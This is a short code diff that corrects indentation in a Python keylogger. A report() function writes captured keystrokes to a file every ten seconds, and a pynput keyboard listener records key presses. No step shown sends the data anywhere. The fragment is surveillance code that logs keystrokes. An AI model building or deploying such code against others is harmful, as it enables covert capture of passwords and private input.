@@ -27,11 +27,11 @@ def report():
     global log
     global path
     with open(path,"a") as fin:
-    fin.write(log)
-    log = ""
-    fin.close()
-    timer = threading.Timer(10, report)
-    timer.start()
+        fin.write(log)
+        log = ""
+        fin.close()
+        timer = threading.Timer(10, report)
+        timer.start()
 
 def start():
     keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
